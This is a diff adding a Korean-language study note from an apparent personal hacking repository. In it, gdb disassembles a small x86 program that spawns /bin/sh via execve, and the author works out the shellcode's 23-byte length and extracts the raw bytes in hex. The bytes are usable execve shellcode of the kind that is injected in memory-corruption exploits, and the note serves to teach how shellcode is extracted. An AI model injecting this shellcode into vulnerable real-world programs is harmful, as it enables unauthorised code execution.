@@ -1,0 +1,57 @@
+* Extract 23 Bytes Shell Code
+
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/optimization/shell_23/x86$ gdb -q asm_optimization_shell_23_atnt
+Reading symbols from asm_optimization_shell_23_atnt...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080483db <+0>:	push   ebp
+   0x080483dc <+1>:	mov    ebp,esp
+   0x080483de <+3>:	xor    eax,eax
+   0x080483e0 <+5>:	push   eax
+   0x080483e1 <+6>:	push   0x68732f2f
+   0x080483e6 <+11>:	push   0x6e69622f
+   0x080483eb <+16>:	mov    ebx,esp
+   0x080483ed <+18>:	mov    ecx,eax
+   0x080483ef <+20>:	mov    edx,eax
+   0x080483f1 <+22>:	mov    al,0xb
+   0x080483f3 <+24>:	int    0x80
+   0x080483f5 <+26>:	nop
+   0x080483f6 <+27>:	pop    ebp
+   0x080483f7 <+28>:	ret
+End of assembler dump.
+
+
+=> main의 assembly code를 확인해보면, shell code 시작 주소가 "0x080483de <+3>:	xor    eax,eax"으로 0x080483de 임을 알 수 있고,
+   마지막 주소의 경우 int 0x80; 이 마지막 명령인데, 해당 명령의 다음 명령(nop) 주소가 0x080483f5 이므로 int 0x08; 명령의 주소는
+   0x080483f3 ~ 0x080483f4 임을 알 수 있다.
+=> 즉, 23 bytes shell code를 위한 assembly code의 주소는 다음과 같다.
+   시작주소 : 0x080483de
+   마지막주소 : 0x080483f4
+
+
+(gdb) p/x 0x080483f4 - 0x080483de
+$1 = 0x16
+
+
+=> shell code의 마지막주소에서 시작주소를 뺀 뒤 1을 더해준 값이 전체 shell code의 bytes수가 되므로,
+   우선, 마지막 주소에서 시작주소를 뺀 값을 구한다.
+
+
+(gdb) p/d 0x16
+$2 = 22
+
+
+=> 16진수 0x16은 10진수로 22
+=> 여기에 1을 더해주어야 하므로 shell code의 총 bytes 수는 23 bytes가 된다.
+
+
+(gdb) x/23bx 0x080483de
+0x80483de <main+3>:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
+0x80483e6 <main+11>:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89
+0x80483ee <main+19>:	0xc1	0x89	0xc2	0xb0	0x0b	0xcd	0x80
+(gdb)
+
+
+=> shell code 명령어의 시작주소인 0x080483de 부터 23 bytes를 dump 떠보면, 위와 같이 총 23 bytes의 shell code를 얻을 수 있다.
+
